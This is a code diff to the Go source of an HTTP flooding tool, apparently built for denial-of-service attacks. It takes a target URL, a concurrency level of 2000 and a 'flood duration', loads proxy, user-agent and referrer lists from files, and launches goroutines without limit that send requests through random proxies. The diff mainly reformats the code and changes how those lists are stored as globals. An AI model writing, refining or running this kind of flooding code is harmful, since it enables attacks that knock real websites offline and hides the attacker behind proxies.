@@ -17,12 +17,12 @@ import (
 )
 
 var (
-	target = flag.String("url", "", "Target URL. Examples: https://github.com or http://google.com")
+	target      = flag.String("url", "", "Target URL. Examples: https://github.com or http://google.com")
 	concurrency = flag.Int("concurrency", 2000, "Defines concurrency across requests")
-	duration = flag.Int("duration", 300, "Flood duration in seconds")
+	duration    = flag.Int("duration", 300, "Flood duration in seconds")
 )
 
-func main(){
+func main() {
 	cpus := runtime.NumCPU()
 	runtime.GOMAXPROCS(cpus)
 
@@ -44,37 +44,47 @@ func main(){
 		log.Fatal("Please satisfy http://domain.com or https://domain.com on flag target")
 	}
 
-	base, err := os.Getwd(); if err != nil {
+	base, err := os.Getwd()
+	if err != nil {
 		log.Fatal(err)
 	}
 
-	files := []string{
-		"accepts.txt",
-		"proxies.txt",
-		"refs.txt",
-		"uas.txt",
+	files := map[string]interface{}{
+		"accepts.txt": &globals.ACCEPTS,
+		"proxies.txt": &globals.PROXIES,
+		"refs.txt":    &globals.REFS,
+		"uas.txt":     &globals.UAS,
 	}
 
-	
-	for i := 0; i < len(files); i++ {
-		file := files[i]
-		name := strings.Split(file,".txt")[0]
-
-		data, err := filesystem.Read(filepath.Join(base, file)); if err != nil {
+	for k, v := range files {
+		data, err := filesystem.Read(filepath.Join(base, k))
+		if err != nil {
 			log.Fatal(err)
 		}
-		globals.Table[name] = data
+		*v.(*[]string) = data
 	}
 
+	// for i := 0; i < len(files); i++ {
+	// 	file := files[i]
+	// 	name := strings.Split(file, ".txt")[0]
+
+	// 	data, err := filesystem.Read(filepath.Join(base, file))
+	// 	if err != nil {
+	// 		log.Fatal(err)
+	// 	}
+	// 	globals.Table[name] = data
+	// }
+
 	bot := &bot.BotClient{
-		Target: *target,
-		StopAt: time.Now().Add(time.Duration(time.Second * time.Duration(*duration))),
+		Target:      *target,
+		StopAt:      time.Now().Add(time.Duration(time.Second * time.Duration(*duration))),
 		Concurrency: *concurrency,
 	}
 	for {
-		go func(){
-			proxy := globals.Table[globals.PROXIES][rand.Intn(len(globals.Table[globals.PROXIES]))]
-			err := bot.Request(proxy); if err != nil {
+		go func() {
+			proxy := globals.PROXIES[rand.Intn(len(globals.PROXIES))]
+			err := bot.Request(proxy)
+			if err != nil {
 				fmt.Printf("[ERR]: %s", err)
 			}
 		}()
